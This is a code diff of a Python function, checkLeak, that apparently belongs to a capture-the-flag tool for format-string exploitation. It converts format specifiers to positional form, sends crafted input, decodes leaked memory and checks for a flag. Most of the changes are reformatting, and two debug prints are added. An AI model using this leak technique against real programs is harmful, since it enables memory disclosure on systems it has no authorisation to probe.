@@ -35,7 +35,9 @@ def checkLeak(
                 iter_num = (i * format_count) + j
                 iter_byte = str(iter_num).encode()
                 input_string = input_string.replace(
-                    b"_%" + format_specifier, b"_%" + iter_byte + b"$" + format_specifier, 1
+                    b"_%" + format_specifier,
+                    b"_%" + iter_byte + b"$" + format_specifier,
+                    1,
                 )
 
             print("[+] Sending input {}".format(input_string))
@@ -61,6 +63,7 @@ def checkLeak(
             ]
             try:
                 data_copy = data_leaks
+                print(data_copy)
                 data_leaks = [binascii.unhexlify(x.decode()) for x in data_leaks]
             except binascii.Error:
                 print("[~] Odd length string detected... Skipping")
@@ -74,10 +77,18 @@ def checkLeak(
 
                 data_leaks = temp_data
             print(data_leaks)
-            full_string += b''.join(data_leaks)
+            full_string += b"".join(data_leaks)
 
         # Only return printable ASCII
-        full_string = b"".join([x.to_bytes(1,'little') if x.to_bytes(1,'little') in string.printable.encode() else b"" for x in full_string])
+        print(b"".join([x.to_bytes(1, "little") for x in full_string]))
+        full_string = b"".join(
+            [
+                x.to_bytes(1, "little")
+                if x.to_bytes(1, "little") in string.printable.encode()
+                else b""
+                for x in full_string
+            ]
+        )
     else:
         for i in range((run_count / format_count) + 1):
 
@@ -118,7 +129,9 @@ def checkLeak(
             full_string += b"".join(data_leaks)
 
         # Only return printable ASCII
-        full_string = b"".join([x if x in string.printable else b"" for x in full_string])
+        full_string = b"".join(
+            [x if x in string.printable else b"" for x in full_string]
+        )
 
     leakProperties = {}
     leakProperties["flag_found"] = False
